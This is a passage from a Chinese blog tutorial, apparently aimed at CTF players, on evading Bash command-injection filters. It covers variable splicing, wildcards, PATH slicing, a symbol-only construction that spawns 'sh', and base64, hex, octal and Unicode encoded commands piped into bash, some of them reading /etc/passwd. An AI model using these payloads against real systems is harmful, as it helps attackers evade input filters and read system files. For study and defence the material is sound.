<h3 id="5-3-变量拼接绕过"><a href="#5-3-变量拼接绕过" class="headerlink" title="5.3  变量拼接绕过"></a>5.3  变量拼接绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=fl;b=ag;<span class="built_in">cat</span>$IFS$a<span class="variable">$b</span></span><br><span class="line">c=a;d=t;$c<span class="variable">$d</span> /flag</span><br></pre></td></tr></table></figure>



<h3 id="5-4-空变量干扰绕过"><a href="#5-4-空变量干扰绕过" class="headerlink" title="5.4  空变量干扰绕过"></a>5.4  空变量干扰绕过</h3><p>使用<code>$*</code>、<code>$@</code>、<code>$x</code>、<code>$&#123;x&#125;</code>（这些变量输出为空）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /fl$*ag</span><br><span class="line"><span class="built_in">cat</span> /fl<span class="variable">$@ag</span></span><br><span class="line"><span class="built_in">cat</span> /fl<span class="variable">$9ag</span></span><br><span class="line"><span class="built_in">cat</span> /fl<span class="variable">$&#123;1&#125;</span>ag</span><br></pre></td></tr></table></figure>



<h3 id="5-5-通配符绕过"><a href="#5-5-通配符绕过" class="headerlink" title="5.5  通配符绕过"></a>5.5  通配符绕过</h3><ul>
<li><p><code>?</code> 匹配单个字符：<code>cat /fla?</code></p>
<p><em><code>Wildcard usage</code></em><br><code>/???/??t /??c/p??s??</code><br><code>/bin/c?t /etc/p?ssw?</code></p>
</li>
<li><p><code>*</code> 匹配任意字符：<code>cat /fla*</code></p>
</li>
<li><p>组合使用：<code>cat /???/pass*</code>（匹配&#x2F;etc&#x2F;passwd）</p>
</li>
</ul>
<ol>
<li><p>[…]表示匹配方括号之中的任意一个字符</p>
</li>
<li><p>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</p>
</li>
<li><p>{…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">cat</span>  t[a-z]st</span><br><span class="line"><span class="built_in">cat</span>  t&#123;a,b,c,d,e,f&#125;st</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-abc.oss-cn-beijing.aliyuncs.com/image/image.png"></p>
<h3 id="5-6-环境变量截取绕过"><a href="#5-6-环境变量截取绕过" class="headerlink" title="5.6  环境变量截取绕过"></a>5.6  环境变量截取绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用PATH环境变量截取字符</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH&#125;</span> <span class="comment"># 输出：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br><span class="line">wh<span class="variable">$&#123;PATH:5:1&#125;</span><span class="variable">$&#123;PATH:8:1&#125;</span>ami <span class="comment"># 拼接出&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> CMD=<span class="string">&quot;Y2F0IC9ldGMvcGFzc3dk&quot;</span>;bash&lt;&lt;&lt;$(<span class="built_in">base64</span> -d&lt;&lt;&lt;<span class="variable">$CMD</span>)</span><br><span class="line">&lt;&lt;&lt; <span class="variable">$CMD</span>：这是一个 Here String，它将变量 <span class="variable">$CMD</span> 的值作为输入传递给后面的命令。</span><br></pre></td></tr></table></figure>

<h3 id="5-7-Shell特殊变量"><a href="#5-7-Shell特殊变量" class="headerlink" title="5.7 Shell特殊变量"></a>5.7 Shell特殊变量</h3><p><em><strong>reference：<a target="_blank" rel="noopener" href="https://c.biancheng.net/">https://c.biancheng.net/</a></strong></em></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/321865.html">https://www.freebuf.com/articles/web/321865.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin/_33725126/article/details/86024670#(%E8%BF%99%E4%B8%AA%E6%96%87%E7%AB%A0%E5%86%99%E7%9A%84%E4%BE%8B%E5%AD%90%E4%B9%9F%E6%AF%94%E8%BE%83%E5%85%A8%E9%9D%A2)">https://blog.csdn.net/weixin\_33725126/article/details/86024670#(这个文章写的例子也比较全面)</a></p>
<p>&#x20;<a target="_blank" rel="noopener" href="https://systemweakness.com/bash-injection-without-alphabets-picoctf-2024-writeup-sansalpha-be70a37ce6eb#(%E8%BF%99%E9%81%93%E9%A2%98%E4%B8%8D%E8%AE%A9%E5%AD%97%E6%AF%8D%E4%BD%86%E6%98%AF%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%95%B0%E5%AD%97)">https://systemweakness.com/bash-injection-without-alphabets-picoctf-2024-writeup-sansalpha-be70a37ce6eb#(这道题不让字母但是可以用数字)</a></p>
<h4 id="Shell-中常用的六种数学计算方式"><a href="#Shell-中常用的六种数学计算方式" class="headerlink" title="Shell 中常用的六种数学计算方式"></a>Shell 中常用的六种数学计算方式</h4><table>
<thead>
<tr>
<th>运算操作符&#x2F;运算命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://c.biancheng.net/view/2480.html">(( ))</a></td>
<td>用于整数运算，效率很高，<strong>推荐使用</strong>。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://c.biancheng.net/view/2504.html">let</a></td>
<td>用于整数运算，和 (()) 类似。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://c.biancheng.net/view/vip_3235.html">$[]</a></td>
<td>用于整数运算，不如 (()) 灵活。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://c.biancheng.net/view/vip_3236.html">expr</a></td>
<td>可用于整数运算，也可以处理字符串。比较麻烦，需要注意各种细节，不推荐使用。</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://c.biancheng.net/view/vip_3237.html">bc</a></td>
<td>Linux下的一个计算器程序，可以处理整数和小数。Shell 本身只支持整数运算，想计算小数就得使用 bc 这个外部的计算器。</td>
</tr>
<tr>
<td>$(( expression ))</td>
<td>会对表达式进行算术求值并返回结果</td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://c.biancheng.net/view/vip_3238.html">declare -i</a></td>
<td>将变量定义为整数，然后再进行数学运算时就不会被当做字符串了。功能有限，仅支持最基本的数学运算（加减乘除和取余），不支持逻辑运算、自增自减等，所以在实际开发中很少使用。</td>
</tr>
</tbody></table>
<p>$() 仅在 Bash Shell 中有效，而反引号可在多种 Shell 中使用。$() 在 Bash 中表示，所有在 $() 中的字符串都会被当作命令执行。</p>
<h4 id="Shell位置参数（命令行参数）-n"><a href="#Shell位置参数（命令行参数）-n" class="headerlink" title="Shell位置参数（命令行参数）$n"></a>Shell位置参数（命令行参数）$n</h4><ol>
<li>给脚本文件传递位置参数</li>
</ol>
<p>&#x20;test.sh：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Language: <span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;URL: <span class="variable">$2</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>运行 test.sh，并附带参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mozhiyan@localhost ~]$ cd demo</span><br><span class="line">[mozhiyan@localhost demo]$ . ./test.sh Shell http://c.biancheng.net/shell/</span><br><span class="line">Language: Shell</span><br><span class="line">URL: http://c.biancheng.net/shell/</span><br></pre></td></tr></table></figure>

<p>其中<code>Shell</code>是第一个位置参数，<code>http://c.biancheng.net/shell/</code>是第二个位置参数，两者之间以空格分隔。</p>
<ul>
<li>给函数传递位置参数</li>
</ul>
<p>test.sh：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">func</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Language: <span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL: <span class="variable">$2</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用函数</span></span><br><span class="line">func C++ http://c.biancheng.net/cplus/</span><br></pre></td></tr></table></figure>

<p>运行 test.sh：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mozhiyan@localhost ~]$ cd demo</span><br><span class="line">[mozhiyan@localhost demo]$ . ./test.sh</span><br><span class="line">Language: C++</span><br><span class="line">URL: http://c.biancheng.net/cplus/</span><br></pre></td></tr></table></figure>

<p>关于函数定义和调用的具体语法请访问：<a target="_blank" rel="noopener" href="https://c.biancheng.net/view/1009.html">Shell函数定义和调用</a>、<a target="_blank" rel="noopener" href="https://c.biancheng.net/view/2860.html">Shell函数参数</a></p>
<p><strong>注意事项</strong></p>
<p>如果参数个数太多，达到或者超过了 10 个，那么就得用<code>$&#123;n&#125;</code>的形式来接收了，例如 ${10}、${23}。</p>
<h4 id="Shell特殊变量：Shell-、-、-、-、"><a href="#Shell特殊变量：Shell-、-、-、-、" class="headerlink" title="Shell特殊变量：Shell $#、$*、$@、$?、$$"></a>Shell特殊变量：Shell $#、$*、$@、$?、$$</h4><table>
<thead>
<tr>
<th>变量</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>$0</td>
<td>当前脚本的文件名。</td>
</tr>
<tr>
<td>$n（n≥1）</td>
<td>传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是 $1，第二个参数是 $2。</td>
</tr>
<tr>
<td>$#</td>
<td>传递给脚本或函数的参数个数。</td>
</tr>
<tr>
<td>$*</td>
<td>传递给脚本或函数的所有参数。</td>
</tr>
<tr>
<td>$@</td>
<td>传递给脚本或函数的所有参数。当被双引号<code>&quot; &quot;</code>包含时，$@ 与 $* 稍有不同，我们将在《<a target="_blank" rel="noopener" href="https://c.biancheng.net/view/vip_4559.html">Shell $*和$@的区别</a>》一节中详细讲解。</td>
</tr>
<tr>
<td>$?</td>
<td>最后一次执行的命令的返回状态。如果这个变量的值为 0，就证明上一条命令正确执行；如果这个变量的值为非 0（具体是哪个数由编程人员决定），就证明上一条命令执行错误</td>
</tr>
<tr>
<td>$$</td>
<td>当前 Shell 进程 ID。对于 Shell 脚本，就是这些脚本所在的进程 ID。</td>
</tr>
<tr>
<td>_</td>
<td>表示上一个命令的最后一个参数或上一个执行的命令的最后一个参数</td>
</tr>
<tr>
<td>$_</td>
<td>表示上一个命令的最后一个参数</td>
</tr>
<tr>
<td>$!</td>
<td>后台运行的最后一个进程的进程 PID</td>
</tr>
</tbody></table>
<ol>
<li>给脚本文件传递参数</li>
</ol>
<p>编写下面的代码，并保存为 test.sh：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Process ID: $$&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;File Name: <span class="variable">$0</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;First Parameter : <span class="variable">$1</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Second Parameter : <span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;All parameters 1: <span class="variable">$@</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;All parameters 2: $*&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Total: <span class="variable">$#</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>运行 test.sh，并附带参数：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">mozhiyan@localhost</span> <span class="string">demo</span>]<span class="string">$</span> <span class="string">.</span> <span class="string">./test.sh</span> <span class="string">Shell</span> <span class="string">Linux</span></span><br><span class="line"><span class="attr">Process ID:</span> <span class="number">5943</span></span><br><span class="line"><span class="attr">File Name:</span> <span class="string">bash</span></span><br><span class="line"><span class="attr">First Parameter :</span> <span class="string">Shell</span></span><br><span class="line"><span class="attr">Second Parameter :</span> <span class="string">Linux</span></span><br><span class="line"><span class="attr">All parameters 1:</span> <span class="string">Shell</span> <span class="string">Linux</span></span><br><span class="line"><span class="attr">All parameters 2:</span> <span class="string">Shell</span> <span class="string">Linux</span></span><br><span class="line"><span class="attr">Total:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<ul>
<li>给函数传递参数</li>
</ul>
<p>编写下面的代码，并保存为 test.sh：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#定义函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">func</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Language: <span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;URL: <span class="variable">$2</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;First Parameter : <span class="variable">$1</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Second Parameter : <span class="variable">$2</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;All parameters 1: <span class="variable">$@</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;All parameters 2: $*&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Total: <span class="variable">$#</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用函数</span></span><br><span class="line">func Java http://c.biancheng.net/java/</span><br></pre></td></tr></table></figure>

<p>运行结果为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Language</span>: Java</span><br><span class="line">URL: http:<span class="operator">/</span><span class="operator">/</span>c.biancheng.net<span class="operator">/</span>java<span class="operator">/</span></span><br><span class="line"><span class="keyword">First</span> <span class="keyword">Parameter</span> : Java</span><br><span class="line"><span class="keyword">Second</span> <span class="keyword">Parameter</span> : http:<span class="operator">/</span><span class="operator">/</span>c.biancheng.net<span class="operator">/</span>java<span class="operator">/</span></span><br><span class="line"><span class="keyword">All</span> parameters <span class="number">1</span>: Java http:<span class="operator">/</span><span class="operator">/</span>c.biancheng.net<span class="operator">/</span>java<span class="operator">/</span></span><br><span class="line"><span class="keyword">All</span> parameters <span class="number">2</span>: Java http:<span class="operator">/</span><span class="operator">/</span>c.biancheng.net<span class="operator">/</span>java<span class="operator">/</span></span><br><span class="line">Total: <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>$?、$$和$!的用法进一步深入<a target="_blank" rel="noopener" href="https://c.biancheng.net/view/claof8i.html">https://c.biancheng.net/view/claof8i.html</a></p>
<h4 id="Shell特殊命令-和"><a href="#Shell特殊命令-和" class="headerlink" title="Shell特殊命令$- 和 $_"></a>Shell特殊命令$- 和 $_</h4><p>reference：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/57784678">https://zhuanlan.zhihu.com/p/57784678</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$- 是 set 命令的 –h 和 –B 的参数, 表示使用内置的 set 命令扩展解释之后的参数行, </span><br><span class="line">   具体分别表示为, 记住工作路径, 和允许使用 ! 历史扩展, 详细请参阅 set 命令.</span><br><span class="line"></span><br><span class="line">$_ (下划线) 表示的是打印上一个输入参数行, 当这个命令在开头时, 打印输出文档的绝对路径名.</span><br></pre></td></tr></table></figure>

<p>举例如下:</p>
<p>例如我们有一个文档, test_3.sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo “Current absolute file path name is: $_”</span><br><span class="line">echo “$-“</span><br><span class="line">echo “Second $_”</span><br><span class="line"></span><br><span class="line">let cnt=1</span><br><span class="line">echo “Third $_”</span><br><span class="line">echo “$cnt”</span><br><span class="line">echo “Fourth $_”</span><br></pre></td></tr></table></figure>

<p>执行命令:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./test_3.sh</span><br></pre></td></tr></table></figure>

<p>输出的结果是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Current absolute file path name is: ./test_3.sh</span><br><span class="line">hB</span><br><span class="line">Second hB</span><br><span class="line">Third cnt=1</span><br><span class="line">1</span><br><span class="line">Fourth 1</span><br></pre></td></tr></table></figure>

<p><em>解释如下:</em></p>
<p>由于我们是在当前路径下执行的文档, 那么在文档开始, 所有命令之前 $_ 获得就是文档的绝对路径名称, .&#x2F;test_3.sh, 这里 . (点号) 表示当前路径.</p>
<p>执行 $- 后, 表示使用 set 的 –h 和 –B 选项, 这时传入的参数是 hB;</p>
<p>第二次执行 $_ 后, 获得上次传入的参数, 表示为 hB;</p>
<p>在第三次执行时, 由于上次对于 let 命令传入的参数是 cnt&#x3D;1, 那么这时获得的参数是 cnt&#x3D;1;</p>
<p>第四次执行时, 对于 echo 传入的参数是扩展后的 $cnt, 也就是 1, 那么这时获得参数就是 1.</p>
<p>Bash 下<code>$&gt;_=:!()&#123;&#125;</code>的极限构造(TFCCTF_minijail)</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">___=$&#123;_&#125;</span>                           </span><br><span class="line"><span class="string">__=$((!_))</span></span><br><span class="line"><span class="string">____=$&#123;!__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">___=$&#123;___:$__&#125;</span></span><br><span class="line"><span class="string">___=$&#123;___:$__&#125;</span></span><br><span class="line"><span class="string">$&#123;____:$((!__)):$__&#125;$&#123;___:$((!__)):$__&#125;</span></span><br></pre></td></tr></table></figure>

<p>在Bash的算术上下文中（<code>$(( ))</code>内部），变量会被尝试转换为整数。转换规则是：</p>
<ul>
<li><p>如果变量看起来像数字（如”123”），则转换为对应数字</p>
</li>
<li><p>如果变量是空字符串或未设置，则转换为0</p>
</li>
<li><p>如果变量是非数字字符串（如”echo”），则转换为0</p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将环境变量_的值（假设为&quot;echo&quot;）赋给变量___</span></span><br><span class="line"><span class="string">___=$&#123;_&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用算术展开生成数字1：!_ 在算术上下文中（_非空视为0，!0=1）得到1，赋给变量__</span></span><br><span class="line"><span class="string">__=$((!_))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 间接引用：$&#123;!__&#125; 即 $&#123;1&#125;，取第一个参数的值（假设为&quot;yooooooo_mama_test&quot;），赋给变量____</span></span><br><span class="line"><span class="string">____=$&#123;!__&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下17行对____进行切片，每次切除第一个字符（偏移量为1），最终____变为&quot;st&quot;（原始字符串切17次后剩余子串）</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"><span class="string">____=$&#123;____:$__&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对___进行两次切片（初始值为&quot;echo&quot;），第一次切为&quot;cho&quot;，第二次切为&quot;ho&quot;</span></span><br><span class="line"><span class="string">___=$&#123;___:$__&#125;</span></span><br><span class="line"><span class="string">___=$&#123;___:$__&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合命令：$&#123;____:0:1&#125; 取&quot;st&quot;的第0个字符（即&quot;s&quot;），$&#123;___:0:1&#125; 取&quot;ho&quot;的第0个字符（即&quot;h&quot;），组合成&quot;sh&quot;并执行</span></span><br><span class="line"><span class="string">$&#123;____:$((!__)):$__&#125;$&#123;___:$((!__)):$__&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="5-8-内联执行绕过"><a href="#5-8-内联执行绕过" class="headerlink" title="5.8 内联执行绕过"></a>5.8 内联执行绕过</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过变量拼接</span></span><br><span class="line">a=f;b=l;c=a;d=g;<span class="built_in">cat</span> $a$b$c<span class="variable">$d</span>.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过命令替换</span></span><br><span class="line"><span class="built_in">cat</span> $(<span class="built_in">echo</span> fla)g.php</span><br><span class="line"><span class="built_in">cat</span> `<span class="built_in">echo</span> fla`g.php</span><br></pre></td></tr></table></figure>



<h2 id="6-编码绕过技术"><a href="#6-编码绕过技术" class="headerlink" title="6. 编码绕过技术"></a>6. 编码绕过技术</h2><h3 id="6-1-Base64编码"><a href="#6-1-Base64编码" class="headerlink" title="6.1 Base64编码"></a>6.1 Base64编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span> | <span class="built_in">base64</span> -d | bash</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span> | <span class="built_in">base64</span> -d | sh</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span> | <span class="built_in">base64</span> -d`</span><br><span class="line">$(<span class="built_in">echo</span> <span class="string">&quot;Y2F0IC9mbGFn&quot;</span> | <span class="built_in">base64</span> -d)</span><br></pre></td></tr></table></figure>



<h3 id="6-2-Hex编码（ASCII编码）"><a href="#6-2-Hex编码（ASCII编码）" class="headerlink" title="6.2 Hex编码（ASCII编码）"></a>6.2 Hex编码（ASCII编码）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 77686F616D69 | xxd -r -p | bash <span class="comment"># whoami的hex</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\x77\x68\x6f\x61\x6d\x69&quot;</span> | bash <span class="comment"># whoami的十六进制格式</span></span><br></pre></td></tr></table></figure>



<h3 id="6-3-八进制编码"><a href="#6-3-八进制编码" class="headerlink" title="6.3  八进制编码"></a>6.3  八进制编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(printf &#x27;\143\141\164\40\146\154\141\147&#x27;)</span>&quot;</span> <span class="comment"># cat flag的八进制</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="6-4-Unicode编码"><a href="#6-4-Unicode编码" class="headerlink" title="6.4  Unicode编码"></a>6.4  Unicode编码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在支持Unicode的环境中可能有效</span></span><br><span class="line"><span class="built_in">echo</span> $<span class="string">&#x27;\u0063\u0061\u0074\u0020\u0066\u006c\u0061\u0067&#x27;</span> <span class="comment"># cat flag</span></span><br></pre></td></tr></table></figure>

